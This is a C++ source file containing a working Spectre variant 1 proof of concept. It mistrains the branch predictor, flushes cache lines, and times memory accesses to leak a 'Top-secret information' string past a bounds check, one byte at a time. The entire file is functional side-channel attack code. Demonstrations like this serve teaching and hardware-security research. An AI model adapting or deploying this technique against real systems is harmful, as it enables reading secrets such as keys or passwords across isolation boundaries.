#include <memory>
#include <array>
#include <chrono>
#include <iostream>
#include <numeric>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <tuple>
#include <x86intrin.h>

namespace {

// Inline assembly instructions: tells the compiler not to optimize away the memory access to the memory block pointed by the input p 
void access_memory(const void* p){__asm__ __volatile__("": : "r"(*static_cast<const uint8_t*>(p)): "memory" ); }

long get_time() {
    #if 1 
        unsigned int i; 
        return _rdtscp(&i); // uses cycle count as a counter 
    #else 
        return std::chrono::duration_cast<std::chrono::nanoseconds>(std::chrono::high_resolution_clock::now().time_since_epoch()).count(); 
    #endif 
}


template <typename T> double average(const T& a, size_t skip_index) {
    double res = 0; 
    for (size_t i = 0; i < a.size(); ++i) {
        if (i != skip_index) res += a[i]; 
    }
    return res / a.size(); 
}

// Increases scores for latencies below average up to a threshold factor 
template <typename L, typename S> void score_latencies(const L& latencies, S& scores, size_t ok_index) {
    const double average_latency = average(latencies, ok_index); 
    constexpr const double latency_threshold = 0.5; 
    for (size_t i = 0; i < latencies.size(); ++i) {
        if (i != ok_index && latencies[i] < average_latency*latency_threshold) ++scores[i]; 
    }
}

// Finds two best scores in the array: 
template<typename S> std::pair<size_t, size_t> best_scores(const S& scores) {
    size_t i1 = 0, i2 = 1; 
    if (scores[i2] > scores[i1]) {using std::swap; swap(i1, i2); } 
    for (size_t i = 2; i < scores.size(); ++i) {
        if (scores[i] > scores[i1]) {
            i2 = i1; 
            i1 = i; 
        } else {
            if (i != i1 && scores[i] > scores[i2]) {
                i2 = i; 
            }
        }
    }
    return {i1, i2}; 
}

char spectre_attack(const char* data, size_t size, size_t evil_index) {

    constexpr const size_t num_val = 256;            
    struct timing_element { char s[1024]; }; 
    static timing_element timing_array[num_val]; 
    ::memset(timing_array, 1, sizeof(timing_array)); 

    std::array<long, num_val> latencies = {}; 
    std::array<int, num_val> scores = {}; 
    size_t i1 = 0, i2 = 0; 
    std::unique_ptr<size_t> data_size(new size_t(size)); 

    constexpr const size_t n_iter = 1000; 
    for (size_t i_iter = 0; i_iter < n_iter; ++i_iter) {
        for (size_t i = 0; i < num_val; ++i) {
            _mm_clflush(timing_array + i); // flushes the most updated values to main memory location
                                           // retrieves subsequent reads from main memory rather than cache
        }
    
        const size_t ok_index = i_iter % size;

        constexpr const size_t n_read = 500; 
        // Train branch predictor: 
        // learn that the most likely branch is the one that accesses the "good part" of the array
        // (evil branch accessed every 1 out of 16 attempts)
        for (size_t i_read = 0; i_read < n_read; ++i_read) {
            _mm_clflush(&*data_size);      // make size slow to access (see comment above)
            for (volatile int z = 0; z < 1000; ++z) {} // delay to separate cache flush from access to data size
            const size_t local_index = (i_read & 0xf) ? ok_index : evil_index; 
            if (local_index < *data_size) {     // ensures that local_index is in cache 
                access_memory(timing_array + data[local_index]); 
            }
        }
        // Now only one of the elements of timing array should be in cache. 
        // As sequentially accessing the whole array will not work due to pre-fetching, 
        // we perform randomized access and store the time it took to access each 
        // element in the array 
        for (size_t i = 0; i < num_val; ++i) {
            const size_t i_rand = (i * 167 + 13) & 0xff; // index randomization 
            const timing_element* const p = timing_array + i_rand; 
            const long t0 = get_time();
            access_memory(p); 
            latencies[i_rand] = get_time() - t0; 
        }

        score_latencies(latencies, scores, ok_index); 
        std::tie(i1, i2) = best_scores(scores); 
        constexpr const int score_threshold1 = 2, score_threshold2 = 100; 
        if (scores[i1] > scores[i2]*score_threshold1 + score_threshold2) return i1; 
    }
    std::cerr << "Spying failed for index " << evil_index << ", scores " << i1 << ": " << scores[i1] << " - " << i2 << ": " << scores[i2] << std::endl;
    return i1;   
}

char* allocate_aligned(size_t alignment, size_t size) {
    void* p; 
    if (posix_memalign(&p, alignment, size)) return nullptr; 
    return static_cast<char*>(p); 
}

}

int main() {
    constexpr const size_t page_size = 4096; 
    char* const data = allocate_aligned(page_size, 2 * page_size); 
    strcpy(data, "Innocuous data"); 
    strcpy(data + page_size, "Top-secret information"); 
    for (size_t i = 0; i < page_size; ++i ) {
        const char c = spectre_attack(data, strlen(data) + 1, page_size + i); 
        std::cout << c << std::flush; 
        if (!c) break; 
    }
    std::cout << std::endl; 
    ::free(data); 
}